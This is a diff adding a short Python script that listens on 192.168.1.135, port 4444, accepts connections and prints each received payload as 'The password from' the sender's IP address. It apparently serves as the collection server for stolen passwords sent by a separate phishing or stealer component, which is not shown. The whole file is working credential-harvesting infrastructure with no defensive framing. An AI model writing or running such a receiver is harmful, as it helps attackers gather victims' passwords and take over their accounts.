@@ -1,0 +1,23 @@
+#!/usr/bin/env python3
+import socket
+from termcolor import colored
+from threading import Thread
+
+print(colored("Enter to kill the server at any time!", "red", attrs=['bold']))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(("192.168.1.135", 4444))
+s.listen()
+
+
+def t():
+    while True:
+        c, addr = s.accept()
+        print("The password from " + colored(addr[0], "cyan") + " is " + colored(
+            c.recv(1024).decode(), "magenta", attrs=['bold']))
+
+
+T = Thread(target=t)
+T.daemon = True
+T.start()
+input()
+print(colored("Stopped...", "red", attrs=['bold', "dark"]))
